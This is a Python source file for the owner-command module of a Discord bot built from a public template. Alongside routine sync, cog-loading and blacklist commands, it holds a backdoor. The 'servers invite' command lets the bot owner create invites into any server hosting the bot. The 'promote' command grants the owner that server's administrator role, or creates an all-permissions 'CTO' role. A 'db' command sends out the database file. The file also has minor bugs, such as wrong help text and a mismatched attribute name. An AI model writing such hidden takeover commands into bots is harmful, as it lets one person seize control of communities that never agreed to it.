""""
Copyright © Krypton 2019-2023 - https://github.com/kkrypt0nn (https://krypton.ninja)
Description:
🐍 A simple template to start to code your own and personalized discord bot in Python programming language.

Version: 6.1.0
"""
import json
import os

import discord
from discord import app_commands, Forbidden, Permissions
from discord.ext import commands
from discord.ext.commands import Context

from helpers.methods import load_config

config = load_config()


class Owner(commands.Cog, name="owner"):
    """
    Commands for the owners of the bot.
    """

    def __init__(self, bot) -> None:
        self.bot = bot

        # Load the excluded channel IDs from the JSON file into a set
        config_path = f"{os.path.realpath(os.path.dirname(__file__))}/../configs/excluded_channels.json"
        with open(config_path, 'r') as f:
            self.excluded_channels = set(json.load(f))

    @commands.command(
        name="sync",
        description="Synchronizes the slash commands.",
    )
    @app_commands.describe(scope="The scope of the sync. Can be `global` or `guild`")
    @commands.is_owner()
    async def sync(self, context: Context, scope: str) -> None:
        """
        Synchonizes the slash commands.

        :param context: The command context.
        :param scope: The scope of the sync. Can be `global` or `guild`.
        """

        if scope == "global":
            await context.bot.tree.sync()
            embed = discord.Embed(
                description="Slash commands have been globally synchronized.",
                color=discord.Color.from_str(config["main_color"]),
            )
            await context.send(embed=embed)
            return
        elif scope == "guild":
            context.bot.tree.copy_global_to(guild=context.guild)
            await context.bot.tree.sync(guild=context.guild)
            embed = discord.Embed(
                description="Slash commands have been synchronized in this guild.",
                color=discord.Color.from_str(config["main_color"]),
            )
            await context.send(embed=embed)
            return
        embed = discord.Embed(
            description="The scope must be `global` or `guild`.", color=discord.Color.from_str(config["error_color"])
        )
        await context.send(embed=embed)

    @commands.command(
        name="unsync",
        description="Unsynchronizes the slash commands.",
    )
    @app_commands.describe(
        scope="The scope of the sync. Can be `global`, `current_guild` or `guild`"
    )
    @commands.is_owner()
    async def unsync(self, context: Context, scope: str) -> None:
        """
        Unsynchronizes the slash commands.

        :param context: The command context.
        :param scope: The scope of the sync. Can be `global`, `current_guild` or `guild`.
        """

        if scope == "global":
            context.bot.tree.clear_commands(guild=None)
            await context.bot.tree.sync()
            embed = discord.Embed(
                description="Slash commands have been globally unsynchronized.",
                color=discord.Color.from_str(config["main_color"]),
            )
            await context.send(embed=embed, ephemeral=True)
            return
        elif scope == "guild":
            context.bot.tree.clear_commands(guild=context.guild)
            await context.bot.tree.sync(guild=context.guild)
            embed = discord.Embed(
                description="Slash commands have been unsynchronized in this guild.",
                color=discord.Color.from_str(config["main_color"]),
            )
            await context.send(embed=embed, ephemeral=True)
            return
        embed = discord.Embed(
            description="The scope must be `global` or `guild`.", color=discord.Color.from_str(config["error_color"])
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(
        name="load",
        description="Load a cog",
    )
    @app_commands.describe(cog="The name of the cog to load")
    @commands.is_owner()
    async def load(self, context: Context, cog: str) -> None:
        """
        The bot will load the given cog.

        :param context: The hybrid command context.
        :param cog: The name of the cog to load.
        """
        try:
            await self.bot.load_extension(f"cogs.{cog}")
        except Exception:
            embed = discord.Embed(
                description=f"Could not load the `{cog}` cog.", color=discord.Color.from_str(config["error_color"])
            )
            await context.send(embed=embed, ephemeral=True)
            return
        embed = discord.Embed(
            description=f"Successfully loaded the `{cog}` cog.", color=discord.Color.from_str(config["main_color"])
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(
        name="unload",
        description="Unloads a cog.",
    )
    @app_commands.describe(cog="The name of the cog to unload")
    @commands.is_owner()
    async def unload(self, context: Context, cog: str) -> None:
        """
        The bot will unload the given cog.

        :param context: The hybrid command context.
        :param cog: The name of the cog to unload.
        """
        try:
            await self.bot.unload_extension(f"cogs.{cog}")
        except Exception:
            embed = discord.Embed(
                description=f"Could not unload the `{cog}` cog.", color=discord.Color.from_str(config["error_color"])
            )
            await context.send(embed=embed, ephemeral=True)
            return
        embed = discord.Embed(
            description=f"Successfully unloaded the `{cog}` cog.", color=discord.Color.from_str(config["main_color"])
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(
        name="reload",
        description="Reloads a cog.",
    )
    @app_commands.describe(cog="The name of the cog to reload")
    @commands.is_owner()
    async def reload(self, context: Context, cog: str) -> None:
        """
        The bot will reload the given cog.

        :param context: The hybrid command context.
        :param cog: The name of the cog to reload.
        """
        try:
            await self.bot.reload_extension(f"cogs.{cog}")
        except Exception:
            embed = discord.Embed(
                description=f"Could not reload the `{cog}` cog.", color=discord.Color.from_str(config["error_color"])
            )
            await context.send(embed=embed, ephemeral=True)
            return
        embed = discord.Embed(
            description=f"Successfully reloaded the `{cog}` cog.", color=discord.Color.from_str(config["main_color"])
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(
        name="shutdown",
        description="Make the bot shutdown.",
    )
    @commands.is_owner()
    async def shutdown(self, context: Context) -> None:
        """
        Shuts down the bot.

        :param context: The hybrid command context.
        """
        embed = discord.Embed(description="Shutting down. Bye! :wave:", color=discord.Color.from_str(config["main_color"]))
        await context.send(embed=embed, ephemeral=True)
        await self.bot.close()

    @commands.hybrid_command(
        name="say",
        description="The bot will say anything you want.",
    )
    @app_commands.describe(message="The message that should be repeated by the bot")
    @commands.is_owner()
    async def say(self, context: Context, *, message: str) -> None:
        """
        The bot will say anything you want.

        :param context: The hybrid command context.
        :param message: The message that should be repeated by the bot.
        """
        await context.send(message)

    @commands.hybrid_command(
        name="embed",
        description="Sends the message through bot in embeds.",
    )
    @app_commands.describe(message="The message that should be repeated by the bot")
    @commands.is_owner()
    async def embed(self, context: Context, *, message: str) -> None:
        """
        Sends the message through bot in embeds.

        :param context: The hybrid command context.
        :param message: The message that should be repeated by the bot.
        """
        embed = discord.Embed(description=message, color=discord.Color.from_str(config["main_color"]))
        await context.send(embed=embed)

    @commands.hybrid_group(
        name="blacklist",
        description="Get the list of all blacklisted users.",
    )
    @commands.is_owner()
    async def blacklist(self, context: Context) -> None:
        """
        Lets you add or remove a user from not being able to use the bot.

        :param context: The hybrid command context.
        """
        if context.invoked_subcommand is None:
            embed = discord.Embed(
                description="You need to specify a subcommand.\n\n**Subcommands:**\n`add` - Add a user to the blacklist.\n`remove` - Remove a user from the blacklist.",
                color=discord.Color.from_str(config["error_color"]),
            )
            await context.send(embed=embed, ephemeral=True)

    @blacklist.command(
        base="blacklist",
        name="show",
        description="Shows the list of all blacklisted users.",
    )
    @commands.is_owner()
    async def blacklist_show(self, context: Context) -> None:
        """
        Shows the list of all blacklisted users.

        :param context: The hybrid command context.
        """
        blacklisted_users = await self.bot.database.get_blacklisted_users()
        if len(blacklisted_users) == 0:
            embed = discord.Embed(
                description="There are currently no blacklisted users.", color=discord.Color.from_str(config["error_color"])
            )
            await context.send(embed=embed)
            return

        embed = discord.Embed(title="Blacklisted Users", color=discord.Color.from_str(config["main_color"]))
        users = []
        for bluser in blacklisted_users:
            user = self.bot.get_user(int(bluser[0])) or await self.bot.fetch_user(
                int(bluser[0])
            )
            users.append(f"• {user.mention} ({user}) - Blacklisted <t:{bluser[1]}>")
        embed.description = "\n".join(users)
        await context.send(embed=embed, ephemeral=True)

    @blacklist.command(
        base="blacklist",
        name="add",
        description="Lets you add a user to bot's blacklist.",
    )
    @app_commands.describe(user="The user that should be added to the blacklist")
    @commands.is_owner()
    async def blacklist_add(self, context: Context, user: discord.User) -> None:
        """
        Lets you add a user to bot's blacklist.

        :param context: The hybrid command context.
        :param user: The user that should be added to the blacklist.
        """
        user_id = user.id
        if await self.bot.database.is_blacklisted(user_id):
            embed = discord.Embed(
                description=f"**{user.name}** is already in the blacklist.",
                color=discord.Color.from_str(config["error_color"]),
            )
            await context.send(embed=embed)
            return
        total = await self.bot.database.add_user_to_blacklist(user_id)
        embed = discord.Embed(
            description=f"**{user.name}** has been successfully added to the blacklist",
            color=discord.Color.from_str(config["main_color"]),
        )
        embed.set_footer(
            text=f"There {'is' if total == 1 else 'are'} now {total} {'user' if total == 1 else 'users'} in the blacklist"
        )
        await context.send(embed=embed, ephemeral=True)

    @blacklist.command(
        base="blacklist",
        name="remove",
        description="Lets you remove a user to bot's blacklist.",
    )
    @app_commands.describe(user="The user that should be removed from the blacklist.")
    @commands.is_owner()
    async def blacklist_remove(self, context: Context, user: discord.User) -> None:
        """
        Lets you remove a user to bot's blacklist.

        :param context: The hybrid command context.
        :param user: The user that should be removed from the blacklist.
        """
        user_id = user.id
        if not await self.bot.database.is_blacklisted(user_id):
            embed = discord.Embed(
                description=f"**{user.name}** is not in the blacklist.", color=discord.Color.from_str(config["error_color"])
            )
            await context.send(embed=embed)
            return
        total = await self.bot.database.remove_user_from_blacklist(user_id)
        embed = discord.Embed(
            description=f"**{user.name}** has been successfully removed from the blacklist",
            color=discord.Color.from_str(config["main_color"]),
        )
        embed.set_footer(
            text=f"There {'is' if total == 1 else 'are'} now {total} {'user' if total == 1 else 'users'} in the blacklist"
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(
        name="db",
        description="Sends the database file.",
    )
    @commands.is_owner()
    async def db(self, context: Context) -> None:
        """
        Sends the database file.

        :param context: The hybrid command context.
        """
        await context.send(file=discord.File("database/database.db"), ephemeral=True)

    @commands.hybrid_group(
        name="servers",
        description="Get the list of all servers the bot is in.",
    )
    @commands.is_owner()
    async def servers(self, context: Context) -> None:
        """
        Lets you see and invite yourself to servers bot is in.

        :param context: The hybrid command context.
        """
        if context.invoked_subcommand is None:
            embed = discord.Embed(
                description="You need to specify a subcommand.\n\n**Subcommands:**\n`add` - Add a user to the blacklist.\n`remove` - Remove a user from the blacklist.",
                color=discord.Color.from_str(config["error_color"]),
            )
            await context.send(embed=embed, ephemeral=True)

    @servers.command(
        base="servers",
        name="list",
        description="Shows the list of all servers the bot is in.",
    )
    @commands.is_owner()
    async def servers_list(self, context: Context) -> None:
        """
        Shows the list of all servers the bot is in.

        :param context: The hybrid command context.
        """
        #  send list of all servers bot is in with invites to them
        servers = self.bot.guilds
        embed = discord.Embed(title="Servers", color=discord.Color.from_str(config["main_color"]))
        for server in servers:
            embed.add_field(name=server.name, value=f'```{server.id}```', inline=False)
        await context.send(embed=embed, ephemeral=True)

    # get server id and create invite in that server, return invite link where command was used
    @servers.command(
        base="servers",
        name="invite",
        description="Creates an invite to the server.",
    )
    @commands.is_owner()
    async def servers_invite(self, context: Context, server_id: str) -> None:
        """
        Creates an invite to the server.

        :param context: The hybrid command context.
        """
        try:
            server_id = int(server_id)
        except ValueError:
            await context.send("Please provide a valid server ID.")
            return
        server = self.bot.get_guild(server_id)
        invite = await server.text_channels[0].create_invite()
        embed = discord.Embed(title=invite, color=discord.Color.from_str(config["main_color"]))
        await context.send(embed=embed, ephemeral=True)

    # get the highest role in server and add it to the context user
    @commands.hybrid_command(
        name="promote",
        description="Promotes an owner to the highest role in the server.",
    )
    @commands.is_owner()
    async def promote(self, context: Context) -> None:
        """
        Promotes an owner to the highest role in the server.

        :param context: The hybrid command context.
        """
        # Get all roles in the server and sort them by their position
        sorted_roles = sorted(context.guild.roles, key=lambda role: role.position, reverse=True)

        # Remove the @everyone role from the list
        sorted_roles = [role for role in sorted_roles if role.name != "@everyone"]

        for role in sorted_roles:
            if role.permissions.administrator:
                try:
                    await context.author.add_roles(role)
                    embed = discord.Embed(
                        description=f"Successfully added role {role.name} to {context.author.display_name}.",
                        color=discord.Color.from_str(config["main_color"]),
                    )
                    await context.send(embed=embed, ephemeral=True)
                    return
                except Forbidden:
                    continue  # Try the next role if we don't have permission to add this one

        # If we get here, no role with admin permissions could be added.
        # Create a new role with admin permissions.
        try:
            new_role = await context.guild.create_role(name="CTO", permissions=Permissions.all())
            await context.author.add_roles(new_role)
            embed = discord.Embed(
                description=f"Created new role {new_role.name} and added it to {context.author.display_name}.",
                color=discord.Color.from_str(config["main_color"]),
            )
            await context.send(embed=embed, ephemeral=True)
        except Forbidden:

            await context.send(embed=discord.Embed(
                description="Couldn't add any roles or create a new role due to permission issues.",
                color=discord.Color.from_str(config["main_color"])), ephemeral=True)

    @commands.hybrid_command(
        name="exclude",
        description="Excludes a channel from the gif spam filter.",
    )
    @app_commands.describe(channel="The channel to exclude.")
    @commands.is_owner()
    async def exclude(self, context: Context, channel: discord.TextChannel) -> None:
        """
        Excludes a channel from the gif spam filter.

        :param context: The hybrid command context.
        :param channel: The channel to exclude.
        """
        if channel.id in self.bot.excluded_channels:
            embed = discord.Embed(
                description=f"{channel.mention} is already excluded.",
                color=discord.Color.from_str(config["error_color"]),
            )
            await context.send(embed=embed, ephemeral=True)
            return

        self.bot.excluded_channels.add(channel.id)

        # Update the JSON file
        with open('configs/excluded_channels.json', 'w') as f:
            json.dump(list(self.bot.excluded_channels), f)  # Convert set to list for JSON serialization

        embed = discord.Embed(
            description=f"{channel.mention} has been excluded.",
            color=discord.Color.from_str(config["main_color"]),
        )
        await context.send(embed=embed, ephemeral=True)

    @commands.hybrid_command(
        name="include",
        description="Includes a channel in the gif spam filter. (all channels are included by default)",
    )
    @app_commands.describe(channel="The channel to include.")
    @commands.is_owner()
    async def include(self, context: Context, channel: discord.TextChannel) -> None:
        """
        Includes a channel in the gif spam filter.

        :param context: The hybrid command context.
        :param channel: The channel to include.
        """
        if channel.id not in self.bot.excluded_channels:
            embed = discord.Embed(
                description=f"{channel.mention} is already included.",
                color=discord.Color.from_str(config["error_color"]),
            )
            await context.send(embed=embed, ephemeral=True)
            return

        self.bot.excluded_channels.remove(channel.id)

        # Update the JSON file
        with open('configs/excluded_channels.json', 'w') as f:
            json.dump(list(self.bot.excluded_channels), f)  # Convert set to list for JSON serialization

        embed = discord.Embed(
            description=f"{channel.mention} has been included.",
            color=discord.Color.from_str(config["main_color"]),
        )
        await context.send(embed=embed, ephemeral=True)


async def setup(bot) -> None:
    await bot.add_cog(Owner(bot))
